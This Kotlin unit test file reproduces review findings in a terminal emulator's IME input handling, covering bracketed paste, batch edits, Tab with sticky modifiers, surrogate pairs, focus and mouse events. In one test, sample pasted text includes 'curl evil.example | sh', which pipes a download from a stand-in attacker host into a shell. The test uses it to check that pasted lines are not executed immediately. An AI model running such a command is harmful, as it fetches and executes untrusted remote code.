/*
 * Copyright 2026 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

@file:OptIn(InternalVtfxApi::class)

package com.google.vtfx.session

import com.google.vtfx.core.InternalVtfxApi
import com.google.vtfx.core.KeyModifiers
import com.google.vtfx.core.KeyStroke
import com.google.vtfx.core.TerminalKey
import com.google.vtfx.gate.MouseAction
import com.google.vtfx.gate.MouseButton
import com.google.vtfx.gate.MouseReport
import java.io.ByteArrayOutputStream
import kotlin.test.assertEquals
import kotlin.test.assertTrue
import org.junit.Test

class ReviewReproTest {
    // R1: Multiline composing text finished via finishComposingText, onKeyDown, closeConnection,
    // setComposingRegion, replaceText, etc. bypasses HostInput.Paste and bracketed paste mode,
    // sending Enter for each line break and executing pasted lines immediately.
    @Test
    fun r1_multilineComposingTextFinished_isSentAsBracketedPaste() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        // Host enables bracketed paste mode (?2004h).
        session.feed("\u001b[?2004h".toByteArray(Charsets.UTF_8))

        // An IME (e.g. clipboard suggestion or voice typing) previews multiline text via
        // setComposingText and then commits it via finishComposingText().
        session.edit { editor ->
            editor.setComposingText("echo safe\ncurl evil.example | sh\n")
            editor.finishComposingText()
        }

        assertEquals(
            "\u001b[200~echo safe\rcurl evil.example | sh\r\u001b[201~",
            sent.toString(Charsets.UTF_8),
        )
    }

    // R2a: Committed newline ("\n") during a batch edit does not flush or empty the input history
    // at once, allowing a subsequent edit in the same batch edit to delete across the line break
    // or cancel the Enter altogether.
    @Test
    fun r2a_commitNewlineInBatchEdit_flushesAndResetsHistoryImmediately() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.edit { it.commitText("ls") }
        sent.reset()

        // Within one batch edit, the IME commits "\n" (Enter) and then deletes 1 character.
        // Per ime-contract.md sections 4.2, 5.1, and 5.2, committing "\n" resets the input history:
        // edits before the reset are sent first, and the history is emptied at once even during a
        // batch edit so that later edits cannot rewrite the previous line or erase the Enter.
        session.edit { editor ->
            editor.beginBatchEdit()
            editor.commitText("\n")
            editor.deleteSurroundingText(1, 0)
            editor.endBatchEdit()
        }

        // Expected: "\r" (Enter for "ls") followed by "\u007f" (1 DEL on the new line).
        // Actual: "\n" was appended to history ("ls\n") and deleted by deleteSurroundingText(1, 0),
        // so the host receives "" (neither Enter nor DEL is sent!).
        assertEquals("\r\u007f", sent.toString(Charsets.UTF_8))
    }

    // R2b: Committed newline ("\n") or Tab ("\t") followed by text in the same batch edit wipes the
    // newly committed text from the input history when endBatchEdit() flushes.
    @Test
    fun r2b_commitTabThenTextInBatchEdit_keepsTextAfterTabInHistory() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })

        // In one batch edit, the IME commits a Tab and then commits "abc" after the Tab.
        session.edit { editor ->
            editor.beginBatchEdit()
            editor.commitText("\t")
            editor.commitText("abc")
            editor.endBatchEdit()
        }

        // Next, the IME replaces "abc" with "abd" (e.g. autocorrect on the text after the Tab).
        // Because flush() cleared the entire history at the end of the batch edit instead of at the
        // Tab reset point, "abc" was wiped from history and only "d" (or a rejected replaceText)
        // remains.
        sent.reset()
        val replaced = session.edit { editor -> editor.replaceText(0, 3, "abd") }

        assertTrue(replaced, "replaceText on text committed after Tab in a batch edit must succeed")
        assertEquals("\u007fd", sent.toString(Charsets.UTF_8))
    }

    // R3a: replaceText with "\n" when replacing non-tail text (to < buffer.length) fails to paste
    // the remainder, sending DELs, an unbracketed Enter (executing the prefix immediately), and
    // unbracketed text, and wiping the suffix from the input history.
    @Test
    fun r3a_replaceTextWithNewlineBeforeEndOfBuffer_isSentAsPaste() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.feed("\u001b[?2004h".toByteArray(Charsets.UTF_8))
        session.edit { it.commitText("echo hi") }
        sent.reset()

        // The IME replaces the space (4..5) with "\n", producing multiline text "echo\nhi" from
        // position 4 onward. Per ime-contract.md sections 4.2 & 6.1, replacing with a line break
        // when text follows is a paste of replacement + buffer.substring(to).
        session.edit { it.replaceText(4, 5, "\n") }

        assertEquals(
            "\u007f\u007f\u007f\u001b[200~\rhi\u001b[201~",
            sent.toString(Charsets.UTF_8),
        )
    }

    // R3b: replaceText with "\n" after a paste in the same batch edit (pastedInBatch) sends Enter
    // instead of pasting the trailing line feed.
    @Test
    fun r3b_replaceTextWithNewlineAfterPasteInSameBatch_isSentAsPaste() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.feed("\u001b[?2004h".toByteArray(Charsets.UTF_8))

        session.edit { editor ->
            editor.beginBatchEdit()
            editor.replaceText(0, 0, "line1\nline2")
            editor.replaceText(0, 0, "\n")
            editor.endBatchEdit()
        }

        assertEquals(
            "\u001b[200~line1\rline2\u001b[201~\u001b[200~\r\u001b[201~",
            sent.toString(Charsets.UTF_8),
        )
    }

    // R4: With stickyModifiers armed, committing "\t" (HT) or sending "\t" via sendText drops the
    // Tab completely and sends 0 bytes to the host.
    @Test
    fun r4_stickyShiftWithCommittedTab_sendsBackTabInsteadOfDroppingIt() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.stickyModifiers = KeyModifiers.of(shift = true)

        session.edit { it.commitText("\t") }

        // Shift+Tab is CSI Z ("\u001b[Z"). Actual: "" (0 bytes sent, Tab is silently lost).
        assertEquals("\u001b[Z", sent.toString(Charsets.UTF_8))
    }

    // R5: Toggling directInput when the edit buffer has not changed since the last restart (e.g. on
    // a fresh session, or right after pressing Enter or Esc) fails to notify onRestartInput().
    @Test
    fun r5_togglingDirectInputWithoutPriorBufferEdit_restartsInput() {
        var restarts = 0
        val session = TerminalSession({})
        session.addObserver(
            object : SessionObserver {
                override fun onOutput(
                    scrolledLines: Long,
                    scrollbackShrank: Boolean,
                    synchronizing: Boolean,
                ) {}

                override fun onScreenChanged() {}

                override fun onUserInput() {}

                override fun onRestartInput() {
                    restarts++
                }
            }
        )

        // User toggles directInput on (e.g. after entering vim normal mode).
        session.directInput = true

        assertEquals(1, restarts)
    }

    // R6: When an unpaired high surrogate at the end of history and an unpaired low surrogate at
    // the start of composing text meet at the history/composing boundary, ImeEditor concatenates
    // them in `text` (`history + composing`) into a single surrogate pair, corrupting delete counts
    // and rejecting valid edits.
    @Test
    fun r6_surrogateHalvesAcrossHistoryAndComposingBoundary_doNotCorruptDeleteCount() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        // 1. IME commits an unpaired high surrogate. Host receives one U+FFFD (1 character).
        session.edit { it.commitText("\ud83d") }
        assertEquals("\ufffd", sent.toString(Charsets.UTF_8))
        sent.reset()

        // 2. IME sets an unpaired low surrogate as composing text (not yet sent to the host).
        session.edit { it.setComposingText("\ude00") }
        assertEquals("", sent.toString(Charsets.UTF_8))

        // 3. IME calls deleteSurroundingText(1, 0) to delete the 1 composing character "\ude00".
        // Nothing should be deleted from the committed history and no DEL should be sent to the
        // host. Actual: splitsSurrogatePair(buffer, 1) merges "\ud83d" and "\ude00", deleting both
        // history and composing and sending 1 DEL to the host!
        session.edit { it.deleteSurroundingText(1, 0) }

        assertEquals("", sent.toString(Charsets.UTF_8))
        assertEquals("\ud83d", session.edit { it.text })
    }

    // R7: onFocusChanged(false) sends the focus-out sequence (CSI O) to the host before flushing
    // pending edits from an open batch edit.
    @Test
    fun r7_onFocusChangedFalse_flushesPendingBatchEditsBeforeSendingFocusOut() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        // Host enables focus event reporting (mode 1004).
        session.feed("\u001b[?1004h".toByteArray(Charsets.UTF_8))
        session.onFocusChanged(true)
        sent.reset()

        // IME commits "abc" inside a batch edit while focused, then the view loses focus before
        // endBatchEdit(). Per ime-contract.md sections 5.1 & 5.2, edits made before the focus-loss
        // reset must be sent before the focus-out event.
        session.edit { editor ->
            editor.beginBatchEdit()
            editor.commitText("abc")
        }
        session.onFocusChanged(false)

        assertEquals("abc\u001b[O", sent.toString(Charsets.UTF_8))
    }

    // R8a: sendMouse(Press) commits and sends composing text and the mouse report to the host, but
    // fails to call SessionObserver.onUserInput(), leaving the display with a stale composing text
    // overlay and selection.
    @Test
    fun r8a_sendMousePress_notifiesUserInputWhenComposingTextIsSent() {
        val sent = ByteArrayOutputStream()
        var userInputs = 0
        val session = TerminalSession({ sent.write(it) })
        session.feed("\u001b[?1000h".toByteArray(Charsets.UTF_8))
        session.addObserver(
            object : SessionObserver {
                override fun onOutput(
                    scrolledLines: Long,
                    scrollbackShrank: Boolean,
                    synchronizing: Boolean,
                ) {}

                override fun onScreenChanged() {}

                override fun onUserInput() {
                    userInputs++
                }

                override fun onRestartInput() {}
            }
        )
        session.edit { it.setComposingText("abc") }
        assertEquals(0, userInputs)

        session.sendMouse(MouseReport(MouseButton.Left, MouseAction.Press, 1, 1))

        assertEquals("abc\u001b[M !!", sent.toString(Charsets.UTF_8))
        assertEquals("", session.edit { it.composingText })
        assertEquals(1, userInputs)
    }

    // R8b: sendMouse(Press) when mouse tracking is off (or when the report is not sent for the
    // current mode/encoding) still commits composing text and resets the input history.
    @Test
    fun r8b_sendMousePressWhenTrackingDisabled_doesNotCommitComposingText() {
        val sent = ByteArrayOutputStream()
        val session = TerminalSession({ sent.write(it) })
        session.edit { it.setComposingText("abc") }

        // Mouse tracking is MouseTracking.None, so no mouse report is sent to the host.
        session.sendMouse(MouseReport(MouseButton.Left, MouseAction.Press, 1, 1))

        assertEquals("", sent.toString(Charsets.UTF_8))
        assertEquals("abc", session.edit { it.composingText })
    }

    // R8c: When onFocusChanged(false) or feed (cursor moving to another line) resets the editor
    // during an open batch edit, it flushes the uncommitted batch edits to the host inside
    // input(notifySent = false), and the subsequent endBatchEdit() sends nothing; thus
    // SessionObserver.onUserInput() is never called for the user's committed text.
    @Test
    fun r8c_resetDuringBatchEdit_notifiesUserInputWhenPendingEditsAreSent() {
        val sent = ByteArrayOutputStream()
        var userInputs = 0
        val session = TerminalSession({ sent.write(it) })
        session.addObserver(
            object : SessionObserver {
                override fun onOutput(
                    scrolledLines: Long,
                    scrollbackShrank: Boolean,
                    synchronizing: Boolean,
                ) {}

                override fun onScreenChanged() {}

                override fun onUserInput() {
                    userInputs++
                }

                override fun onRestartInput() {}
            }
        )

        session.edit { it.beginBatchEdit() }
        session.edit { it.commitText("abc") }
        assertEquals(0, userInputs)

        // Focus loss (or host output moving to another line) flushes "abc" to the host.
        session.onFocusChanged(false)
        session.edit { it.endBatchEdit() }

        assertEquals("abc", sent.toString(Charsets.UTF_8))
        assertEquals(1, userInputs)
    }
}
